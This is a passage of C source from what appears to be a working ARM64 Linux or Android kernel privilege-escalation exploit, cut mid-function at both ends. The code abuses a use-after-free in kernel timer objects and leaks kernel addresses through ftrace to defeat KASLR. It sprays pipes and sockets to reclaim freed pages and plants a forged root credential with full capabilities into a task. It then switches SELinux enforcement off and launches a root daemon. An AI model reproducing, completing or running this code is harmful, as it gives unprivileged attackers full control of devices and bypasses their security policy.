	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	uint64_t victim_base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	unsigned char *page;
	int ncpu, wrote_pages = 0, free_hits = 0, order0 = 0, order1 = 0;
	if (node_off + 24 > 4096)
		return -1;
	page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page == MAP_FAILED)
		return -1;
	memset(page, 0, 4096);
	{
		uint64_t *node = (uint64_t *)(page + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[pipe] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < g_ncatch; i++) {
		int done = 0;
		if ((i % 32) == 0) {
			struct timespec pause = { .tv_nsec = 100000000 };
			pin_cpu((i / 32) % ncpu);
			if (i)
				nanosleep(&pause, NULL);
		}
		while (done < 4096) {
			ssize_t n = write(g_catch[i][1], page + done, (size_t)(4096 - done));
			if (n < 0)
				break;
			done += (int)n;
		}
		if (done == 4096)
			wrote_pages++;
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			if (pfn == UINT64_MAX || !watch_has(pfn))
				continue;
			if (strstr(line, "mm_page_free:"))
				free_hits++;
			if (!strstr(line, "mm_page_alloc:"))
				continue;
			if (pfn != node_pfn && pfn != victim_base)
				continue;
			if (strstr(line, "order=0"))
				order0++;
			if (strstr(line, "order=1"))
				order1++;
			dprintf(STDOUT_FILENO, "[pipe-alloc] %s", line);
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[pipe] wrote=%d frees=%d victim_order0=%d victim_order1=%d\n",
		wrote_pages, free_hits, order0, order1);
	quiet_reclaim_trace();
	munmap(page, 4096);
	return order0 > 0 ? 0 : -1;
}

static int g_stream[4][2];
static int g_nstream;
static unsigned g_shift;
static uint64_t g_task;
static uint64_t g_cred_kva;
static int g_plant_cred;
static int g_wake[2] = { -1, -1 };
static int g_report[2] = { -1, -1 };
static pid_t g_cred_child_pid = -1;

static void close_stream(void)
{
	for (int i = 0; i < g_nstream; i++) {
		if (g_stream[i][0] >= 0)
			close(g_stream[i][0]);
		if (g_stream[i][1] >= 0)
			close(g_stream[i][1]);
		g_stream[i][0] = g_stream[i][1] = -1;
	}
	g_nstream = 0;
}

int pc98260_run_rootd(void);

static int reclaim_stream(uint64_t victim, uint64_t target)
{
	uint64_t base = object_pfn(victim + KITIMER_NODE) & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0x1fff);
	unsigned char *pat;
	int big = 16 << 20, hit = 0, writes = 0, ncpu;
	struct timespec start, now;
	if (node_off + 24 > 8192)
		return -1;
	pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pat == MAP_FAILED)
		return -1;
	memset(pat, 0, 8192);
	if (g_plant_cred && g_tiles_on) {
		uint64_t page = PAGE_OFFSET + (base << 12);
		unsigned blob = 0x1f00;
		for (int b = 0; b < 3; b++) {
			unsigned off = g_tile_off[b];
			uint64_t *node = (uint64_t *)(pat + off);
			if (off + 24 > 8192) {
				dprintf(STDOUT_FILENO, "[cred] tile %d off=%#x\n", b, off);
				munmap(pat, 8192);
				return -1;
			}
			if (g_tile_kind[b] == TILE_CRED) {
				uint64_t node_kva = page + off;
				uint64_t cred_kva = node_kva + CRED_OFF;
				uint64_t *cred;
				if (off + CRED_OFF + 184 > blob) {
					dprintf(STDOUT_FILENO,
						"[cred] cred tile off=%#x collides\n", off);
					munmap(pat, 8192);
					return -1;
				}
				node[0] = g_task + TASK_CRED - 8;
				node[1] = cred_kva;
				node[2] = 0;
				cred = (uint64_t *)(pat + off + CRED_OFF);
				*(uint64_t *)((char *)cred + 48) = FULLCAP;
				*(uint64_t *)((char *)cred + 56) = FULLCAP;
				*(uint64_t *)((char *)cred + 64) = FULLCAP;
				*(uint64_t *)((char *)cred + 72) = FULLCAP;
				*(uint64_t *)((char *)cred + 80) = FULLCAP;
				*(uint64_t *)((char *)cred + 128) = page + blob;
				*(uint64_t *)((char *)cred + 136) =
					slide_addr(LINK_ROOT_USER);
				*(uint64_t *)((char *)cred + 144) =
					slide_addr(LINK_USER_NS);
				*(uint64_t *)((char *)cred + 152) =
					slide_addr(LINK_UCOUNTS);
				*(uint64_t *)((char *)cred + 160) =
					slide_addr(LINK_GROUPS);
				g_cred_kva = cred_kva;
				dprintf(STDOUT_FILENO,
					"[cred] node=%#" PRIx64 " cred=%#" PRIx64
					" task+cred=%#" PRIx64 " off=%#x\n",
					node_kva, cred_kva, g_task + TASK_CRED, off);
			} else if (g_tile_kind[b] == TILE_SELINUX) {
				node[0] = 0;
				node[1] = 0;
				node[2] = slide_addr(SELINUX_LINK) - 7;
				dprintf(STDOUT_FILENO,
					"[selinux] tile off=%#x target=%#" PRIx64 "\n",
					off, (uint64_t)(slide_addr(SELINUX_LINK) - 7));
			}
		}
	} else if (g_plant_cred) {
		uint64_t page = PAGE_OFFSET + (base << 12);
		uint64_t node_kva = victim + KITIMER_NODE;
		uint64_t cred_kva = node_kva + CRED_OFF;
		unsigned blob = node_off >= 0x40 ? 0 : 0x1f00;
		uint64_t *node, *cred;
		if (node_off + CRED_OFF + 184 > 8192 || blob + 32 > 8192 ||
		    page + node_off != node_kva) {
			dprintf(STDOUT_FILENO, "[cred] plant does not fit off=%#x\n",
				node_off);
			munmap(pat, 8192);
			return -1;
		}
		if (!(node_off + CRED_OFF >= blob + 32 ||
		      blob >= node_off + CRED_OFF + 184)) {
			dprintf(STDOUT_FILENO, "[cred] blob overlaps node\n");
			munmap(pat, 8192);
			return -1;
		}
		/* rb_erase writes twice: *(child) = pc, and parent->rb_right/left =
		 * child. The old tile used the child side to install cred, so its
		 * sibling write dropped &task->cred onto node_kva+8 -- straight over
		 * cred+8 (uid/gid) -- and the flow spent two more UAFs cleaning that
		 * up. Flipping the roles removes the damage and buys something
		 * better: the written value becomes rb_right, i.e. free choice, so
		 * the cred no longer has to sit on top of the rb_node at all.
		 *
		 *   __rb_parent_color = &task->cred - 8     parent for the splice
		 *   rb_right          = node_kva + CRED_OFF  the pointer installed
		 *   rb_left           = 0                    single-child fast path
		 */
		node = (uint64_t *)(pat + node_off);
		node[0] = g_task + TASK_CRED - 8;
		node[1] = cred_kva;
		node[2] = 0;
		cred = (uint64_t *)(pat + node_off + CRED_OFF);
		*(uint64_t *)((char *)cred + 48) = FULLCAP;
		*(uint64_t *)((char *)cred + 56) = FULLCAP;
		*(uint64_t *)((char *)cred + 64) = FULLCAP;
		*(uint64_t *)((char *)cred + 72) = FULLCAP;
		*(uint64_t *)((char *)cred + 80) = FULLCAP;
		*(uint64_t *)((char *)cred + 128) = page + blob;
		*(uint64_t *)((char *)cred + 136) = slide_addr(LINK_ROOT_USER);
		*(uint64_t *)((char *)cred + 144) = slide_addr(LINK_USER_NS);
		*(uint64_t *)((char *)cred + 152) = slide_addr(LINK_UCOUNTS);
		*(uint64_t *)((char *)cred + 160) = slide_addr(LINK_GROUPS);
		dprintf(STDOUT_FILENO,
			"[cred] node=%#" PRIx64 " cred=%#" PRIx64 " task+cred=%#" PRIx64 " off=%#x\n",
			node_kva, cred_kva, g_task + TASK_CRED, node_off);
	} else {
		unsigned align = node_off % 24u;
		for (unsigned off = align; off + 24 <= 8192; off += 24) {
			uint64_t *node = (uint64_t *)(pat + off);
			node[0] = 0;
			node[1] = 0;
			node[2] = target;
		}
		dprintf(STDOUT_FILENO, "[stream] tile align=%u off=%#x\n", align, node_off);
	}
	g_nstream = 0;
	for (int i = 0; i < 4; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_stream[i]))
			break;
		setsockopt(g_stream[i][0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
		setsockopt(g_stream[i][1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
		fcntl(g_stream[i][0], F_SETFL, O_NONBLOCK);
		g_nstream++;
	}
	if (!g_nstream) {
		munmap(pat, 8192);
		return -1;
	}
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[stream] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
		g_nstream, base, node_off);
	if (write_file(TRACE "/buffer_size_kb", "65536\n")) {
		close_stream();
		return -1;
	}
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss()) {
		close_stream();
		return -1;
	}
	{
		/* The page normally returns within a few hundred ms of the kill;
		   waiting 8 s on a miss just burns the retry budget. */
		struct timespec pause = { .tv_nsec = 50000000 };
		int freed = 0;
		for (int i = 0; i < 20 && !freed; i++) {
			nanosleep(&pause, NULL);
			freed = trace_seen("mm_page_free:", base);
		}
		dprintf(STDOUT_FILENO, "[stream] page_freed=%d\n", freed);
	}
	clock_gettime(CLOCK_MONOTONIC, &start);
	for (int round = 0; round < 6 && !hit; round++) {
		for (int i = 0, sock = 0; i < 80 && !hit; i++) {
			ssize_t n;
			pin_cpu(i % ncpu);
			n = write(g_stream[sock][0], pat, 8192);
			if (n == 8192)
				writes++;
			else if (++sock >= g_nstream)
				break;
		}
		hit = trace_seen("mm_page_alloc:", base);
		clock_gettime(CLOCK_MONOTONIC, &now);
		if (now.tv_sec - start.tv_sec > 8)
			break;
	}
	write_file(TRACE "/tracing_on", "0\n");
	if (hit)
		dprintf(STDOUT_FILENO, "[stream] hit pfn=%#" PRIx64 "\n", base);
	dprintf(STDOUT_FILENO, "[stream] writes=%d hit=%d\n", writes, hit);
	quiet_reclaim_trace();
	munmap(pat, 8192);
	if (!hit)
		close_stream();
	return hit ? 0 : -1;
}

static int g_dgram[2] = { -1, -1 };

static int reclaim_dgram(uint64_t victim, uint64_t target)
{
	uint64_t node_pfn = object_pfn(victim + KITIMER_NODE);
	uint64_t base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0xfff);
	unsigned char *buf;
	int ncpu, sent = 0, hit = 0, big = 8 << 20;
	int victim_frees = 0, buddy_frees = 0, order2 = 0;
	uint64_t buddy = base ^ UINT64_C(2);
	if (node_off + 24 > 4096)
		return -1;
	buf = mmap(NULL, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED)
		return -1;
	memset(buf, 0, 16000);
	for (int page = 0; page < 4; page++) {
		unsigned off = (unsigned)page * 4096u + node_off;
		uint64_t *node;
		if (off + 24 > 16000)
			continue;
		node = (uint64_t *)(buf + off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_dgram)) {
		munmap(buf, 16384);
		return -1;
	}
	setsockopt(g_dgram[0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
	setsockopt(g_dgram[1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
	fcntl(g_dgram[0], F_SETFL, O_NONBLOCK);
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[dgram] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < 512; i++) {
		struct timespec pause = { .tv_nsec = 40000000 };
		ssize_t n;
		if ((i % 8) == 0)
			pin_cpu((i / 8) % ncpu);
		n = send(g_dgram[0], buf, 16000, MSG_DONTWAIT);
		if (n == 16000)
			sent++;
		else if (i > 16 && sent > 8)
			break;
		if ((i % 8) == 7)
			nanosleep(&pause, NULL);
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn;
			pfn = parse_pfn(line);
			if (pfn == UINT64_MAX)
				continue;
			if (strstr(line, "mm_page_free:") && strstr(line, "order=1")) {
				if (pfn == base)
					victim_frees++;
				if (pfn == buddy)
					buddy_frees++;
			}
			if (!strstr(line, "mm_page_alloc:") || !strstr(line, "order=2"))
				continue;
			order2++;
			if (base == pfn || base == pfn + 2) {
				hit = 1;
				dprintf(STDOUT_FILENO, "[dgram] hit %s", line);
			}
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[dgram] sent=%d hit=%d order2=%d victim_frees=%d buddy_frees=%d buddy=%#" PRIx64 "\n",
		sent, hit, order2, victim_frees, buddy_frees, buddy);
	quiet_reclaim_trace();
	munmap(buf, 16384);
	return hit ? 0 : -1;
}

static double now_s(void)
{
	struct timespec t;
	clock_gettime(CLOCK_MONOTONIC, &t);
	return (double)t.tv_sec + (double)t.tv_nsec / 1e9;
}

/* Choose three timers that (a) sit in the same 8 KB slab and (b) cover three
   different clock bases, so the three drain loops each hit one of them. The
   leak gives us every k_itimer KVA in creation order, and the creation loop
   assigns clock base i%3, so the base of index i is simply i%3. */
static int pick_triple(int total)
{
	/* The very first slab of the cache stays frozen as the cpu_slab and never
	   returns to the buddy (measured: page_freed=0 forever), so only middle
	   slabs are candidates. Start with the slab that held index 1024 -- the
	   one the single-timer build proved frees -- and then sweep the middle
	   half. */
	uint64_t pref = total > 1024 ? g_all[1024] & ~UINT64_C(0x1fff) : 0;
	int lo = total / 3;
	int hi = total - total / 3;
	for (int pass = 0; pass < 2; pass++) {
	for (int i = lo; i < hi; i++) {
		uint64_t slab = g_all[i] & ~UINT64_C(0x1fff);
		int idx[3] = { -1, -1, -1 };
		if (pass == 0 && slab != pref)
			continue;
		for (int j = i; j < total; j++) {
			int b;
			if ((g_all[j] & ~UINT64_C(0x1fff)) != slab)
				break;
			b = j % 3;
			if (idx[b] < 0)
				idx[b] = j;
		}
		if (idx[0] < 0 || idx[1] < 0 || idx[2] < 0)
			continue;
		/* the cred tile carries a 184-byte struct cred plus a fake
		   security blob at 0x1f00, both inside this slab */
		if ((unsigned)((g_all[idx[0]] + KITIMER_NODE) & 0x1fff) +
		    CRED_OFF + 184 > 0x1f00)
			continue;
		for (int b = 0; b < 3; b++) {
			g_bases[b] = idx[b];
			g_tile_off[b] = (unsigned)((g_all[idx[b]] + KITIMER_NODE) &
						   0x1fff);
		}
		g_tile_kind[0] = TILE_CRED;
		g_tile_kind[1] = TILE_SELINUX;
		g_tile_kind[2] = TILE_NONE;
		dprintf(STDOUT_FILENO,
			"[triple] slab=%#" PRIx64 " idx=%d/%d/%d off=%#x/%#x/%#x\n",
			slab, g_bases[0], g_bases[1], g_bases[2], g_tile_off[0],
			g_tile_off[1], g_tile_off[2]);
		return 0;
	}
	}
	return -1;
}

static int one_uaf(uint64_t target)
{
	double t0 = now_s();
	pid_t child;
	int code, status = 0;
	uint64_t ptrs[64];
	int nptr, ntext;
	uint64_t victim;
	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
	ipc->nhelpers = 0;
	ipc->arm_idx[0] = ipc->arm_idx[1] = ipc->arm_idx[2] = -1;
	atomic_store_explicit(&ipc->arm_ready, 0, memory_order_relaxed);
	g_tiles_on = 0;
	child = fork();
	if (child < 0)
		return -1;
	if (child == 0) {
		if (g_wake[0] >= 0)
			close(g_wake[0]);
		if (g_wake[1] >= 0)
			close(g_wake[1]);
		if (g_report[0] >= 0)
			close(g_report[0]);
		if (g_report[1] >= 0)
			close(g_report[1]);
		child_race();
	}
	if (wait_phase(1)) {
		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n",
			atomic_load_explicit(&ipc->phase, memory_order_acquire));
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (write_file(TRACE "/buffer_size_kb", "16384\n") ||
	    trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		kill(child, SIGKILL);
		stop_helpers();
		return -1;
	}
	double t_ready = now_s();
	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
	if (wait_phase(3)) {
		dprintf(STDOUT_FILENO, "[uaf] timer was not created\n");
		write_file(TRACE "/tracing_on", "0\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	double t_timers = now_s();
	write_file(TRACE "/tracing_on", "0\n");
	if (collect_nth(1024, &nptr, &victim)) {
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (nptr < 1500) {
		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (g_plant_cred && pick_triple(nptr) == 0) {
		g_tiles_on = 1;
		victim = g_all[g_bases[0]];
		ipc->arm_idx[0] = g_bases[0];
		ipc->arm_idx[1] = g_bases[1];
		ipc->arm_idx[2] = g_bases[2];
	} else {
		int base = 1024 % 3;
		ipc->arm_idx[base] = 1024;
		if (!g_plant_cred)
			dprintf(STDOUT_FILENO, "[triple] single-base pass base=%d\n",
				base);
	}
	atomic_store_explicit(&ipc->arm_ready, 1, memory_order_release);
	if (trigger_cmd("disable_event:kmem:kmem_cache_alloc\n"))
		return -1;
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	atomic_store_explicit(&ipc->phase, 4, memory_order_release);
	double t_collect = now_s();
	if (g_plant_cred)
		g_cred_kva = victim + KITIMER_NODE + CRED_OFF;
	if (reclaim_stream(victim, target)) {
		dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
		stop_helpers();
		return -1;
	}
	double t_reclaim = now_s();
	close_socks();
	code = wait_zombie(child, &status);
	dprintf(STDOUT_FILENO,
		"[t] ready=%.1f timers=%.1f collect=%.1f reclaim=%.1f reap=%.1f total=%.1f\n",
		t_ready - t0, t_timers - t_ready, t_collect - t_timers,
		t_reclaim - t_collect, now_s() - t_reclaim, now_s() - t0);
	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
		child, code, status);
	if (waitpid(child, &status, 0) < 0)
		return -1;
	dprintf(STDOUT_FILENO, "[uaf] reaped status=%d\n", status);
	{
		char eb[8] = { 0 };
		int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
		if (efd >= 0) {
			if (read(efd, eb, 1) < 0)
				eb[0] = 0;
			close(efd);
		}
		dprintf(STDOUT_FILENO, "[uaf] enforce after reap=%c\n",
			eb[0] ? eb[0] : (char)0x3f);
	}
	destroy_rings();
	stop_helpers();
	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
		return -1;
	}
	return 0;
}

static void cred_child(void)
{
	sigset_t block;
	setpgid(0, 0);
	sigfillset(&block);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	g_wake[1] = g_report[0] = -1;
	dprintf(STDOUT_FILENO, "[child-cred] waiting pid=%d\n", getpid());
	for (;;) {
		unsigned uid, euid, gid, egid;
		unsigned char go;
		char msg[96];
		if (read(g_wake[0], &go, 1) != 1)
			continue;
		uid = getuid();
		euid = geteuid();
		gid = getgid();
		egid = getegid();
		snprintf(msg, sizeof(msg), "uid=%u euid=%u gid=%u egid=%u\n",
			 uid, euid, gid, egid);
		if (write(g_report[1], msg, strlen(msg)) < 0)
			dprintf(STDOUT_FILENO, "[child-cred] answer errno=%d\n", errno);
		dprintf(STDOUT_FILENO, "[child-cred] %s", msg);
		if (uid == 0 && euid == 0) {
			/* FULLCAP carries CAP_MAC_ADMIN, so the root cred can switch
			   SELinux off through selinuxfs -- no second UAF needed. */
			int sfd = open("/sys/fs/selinux/enforce",
				       O_WRONLY | O_CLOEXEC);
			if (sfd >= 0) {
				ssize_t w = write(sfd, "0", 1);
				close(sfd);
				dprintf(STDOUT_FILENO,
					"[selinux] cap_mac_admin write=%zd errno=%d\n",
					w, errno);
			}
			pc98260_run_rootd();
		}
	}
}

static void log_proc_uid(pid_t pid)
{
	char path[64];
	char line[160];
	FILE *file;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
	file = fopen(path, "r");
	if (!file)
		return;
	while (fgets(line, sizeof(line), file)) {
		if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
		    !strncmp(line, "State:", 6))
			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
	}
	fclose(file);
}

static int ask_child(unsigned *uid, unsigned *euid)
{
	char buf[80];
	struct pollfd pfd;
	unsigned char go = 1;
	ssize_t n;
	if (kill(g_cred_child_pid, 0) != 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d is dead errno=%d\n",
			g_cred_child_pid, errno);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	fcntl(g_report[0], F_SETFL, O_NONBLOCK);
	while (read(g_report[0], buf, sizeof(buf)) > 0)
		;
	fcntl(g_report[0], F_SETFL, 0);
	if (write(g_wake[1], &go, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred] ask write errno=%d\n", errno);
		return -1;
	}
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 2000) <= 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d stayed silent\n",
			g_cred_child_pid);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	n = read(g_report[0], buf, sizeof(buf) - 1);
	if (n < 0) {
		dprintf(STDOUT_FILENO, "[cred] answer read errno=%d\n", errno);
		return -1;
	}
	buf[n > 0 ? n : 0] = 0;
	dprintf(STDOUT_FILENO, "[cred] answer %s", buf);
	if (sscanf(buf, "uid=%u euid=%u", uid, euid) == 2)
		return 0;
	return -1;
}

#define MAX_TASK_CAND 16
static uint64_t g_tasks[MAX_TASK_CAND];
static uint64_t g_tsites[MAX_TASK_CAND];
static int g_ntasks;

static int leak_task(void)
{
	uint8_t *buf;
	int hits = 0;
	if (pipe(g_wake) || pipe(g_report))
		return -1;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on())
		return -1;
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return -1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	write_file(TRACE "/tracing_on", "0\n");
	buf = malloc(4U << 20);
	if (!buf)
		return -1;
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		size_t used = 0;
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		for (;;) {
			ssize_t n = read(fd, buf + used, (4U << 20) - used);
			if (n <= 0)
				break;
			used += (size_t)n;
			if (used + 65536 >= (4U << 20))
				break;
		}
		close(fd);
		for (size_t i = 0; i + 32 <= used; i++) {
			uint64_t site, ptr, req;
			memcpy(&req, buf + i + 24, 8);
			if (req != 5760)
				continue;
			memcpy(&site, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
				continue;
			/* A page-aligned pointer cannot be a slab object; those come
			   from order-N allocations that share the 5760-byte size class
			   and would send task->cred into the wrong page. Keep the first
			   slab-looking candidate instead of the last record seen. */
			/* Several task_struct-sized allocations are live at any time
			   (other processes fork too), so keep every candidate and let
			   the cred loop walk them instead of retrying one wrong one. */
			{
				int dup = 0;
				for (int k = 0; k < g_ntasks; k++)
					if (g_tasks[k] == ptr)
						dup = 1;
				if (!dup &&
				    g_ntasks < (int)(sizeof(g_tasks) / sizeof(g_tasks[0]))) {
					g_tsites[g_ntasks] = site;
					g_tasks[g_ntasks] = ptr;
					g_ntasks++;
				}
			}
			hits++;
			dprintf(STDOUT_FILENO, "[task] site=%#" PRIx64 " ptr=%#" PRIx64 "\n",
				site, ptr);
		}
	}
	free(buf);
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	write_file(TRACE "/tracing_on", "0\n");
	if (!g_ntasks)
		return -1;
	/* The task_struct allocation happens at one fixed call site, so the
	   busiest site is the fork path; a 5760-byte record from any other call
	   site belongs to some unrelated allocation of the same size class. */
	if (g_ntasks > 1) {
		int best = 0, best_count = 0;
		for (int i = 0; i < g_ntasks; i++) {
			int c = 0;
			for (int j = 0; j < g_ntasks; j++)
				if (g_tsites[j] == g_tsites[i])
					c++;
			if (c > best_count) {
				best_count = c;
				best = i;
			}
		}
		if (best_count > 1) {
			uint64_t order[MAX_TASK_CAND];
			uint64_t site = g_tsites[best];
			int n = 0;
			for (int i = 0; i < g_ntasks; i++)
				if (g_tsites[i] == site)
					order[n++] = g_tasks[i];
			for (int i = 0; i < g_ntasks; i++)
				if (g_tsites[i] != site)
					order[n++] = g_tasks[i];
			for (int i = 0; i < g_ntasks; i++)
				g_tasks[i] = order[i];
			dprintf(STDOUT_FILENO, "[task] busiest site=%#" PRIx64 " x%d\n",
				site, best_count);
		}
	}
	g_task = g_tasks[0];
	dprintf(STDOUT_FILENO, "[task] %d candidate(s), first=%#" PRIx64 "\n",
		g_ntasks, g_task);
	return 0;
}

static int leak_cred(uint64_t *cred)
{
	uint64_t ptrs[8];
	int n;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss())
		return -1;
	if (trace_off_on())
		return -1;
	if (syscall(SYS_setresuid, -1, -1, -1))
		dprintf(STDOUT_FILENO, "[cred] setresuid errno=%d\n", errno);
	write_file(TRACE "/tracing_on", "0\n");
	n = collect_site(slide_addr(CRED_LINK), 184, ptrs, 8);
	dprintf(STDOUT_FILENO, "[cred] ptrs=%d\n", n);
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	if (n < 1)
		return -1;
	*cred = ptrs[n - 1];
	dprintf(STDOUT_FILENO, "[cred] object=%#" PRIx64 "\n", *cred);
	return 0;
}

static void read_enforce(void)
{
	char buf[8] = { 0 };
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		dprintf(STDOUT_FILENO, "[selinux] enforce read errno=%d\n", errno);
		return;
	}
	if (read(fd, buf, sizeof(buf) - 1) > 0)
		dprintf(STDOUT_FILENO, "[selinux] enforce=%s", buf);
	close(fd);
}

int pc98260_run_rootd(void);


/* ARM64 KASLR moves the image in 2 MiB steps; anything else is a mis-read. */
#define SLIDE_ALIGN UINT64_C(0x200000)
#define SLIDE_SAMPLES 3

static uint64_t measure_slide_once(void)
{
	uint8_t *buf = malloc(8U << 20);
	size_t used = 0;
	uint64_t slide = 0;
	struct sigevent ev;
	timer_t id;
	if (!buf)
		return 0;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		free(buf);
		return 0;
	}
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id) == 0)
		timer_delete(id);
	write_file(TRACE "/tracing_on", "0\n");
	/* One 4 KiB page of records is plenty to recover the call site. */
	if (read_raw(buf, 8U << 20, &used, 4096) == 0) {
		for (size_t i = 0; i + 32 <= used; i++) {
			uint64_t site, ptr, req;
			memcpy(&site, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			memcpy(&req, buf + i + 24, 8);
			if (req != 384)
				continue;
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff)
				continue;
			slide = site - TIMER_LINK;
			break;
		}
	}
	free(buf);
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	write_file(TRACE "/tracing_on", "0\n");
	return slide;
}

/*
 * A wrong slide turns every later write into a wild kernel pointer, so the
 * value is only accepted when it is 2 MiB aligned and reproducible. Guess
 * once and this stops being a root tool and starts being a brick tool.
 */
static uint64_t measure_slide(void)
{
	uint64_t cand[SLIDE_SAMPLES];
	int n = 0;

	for (int i = 0; i < SLIDE_SAMPLES; i++) {
		uint64_t s = measure_slide_once();
		if (!s) {
			dprintf(STDOUT_FILENO, "[slide] sample %d empty\n", i + 1);
			continue;
		}
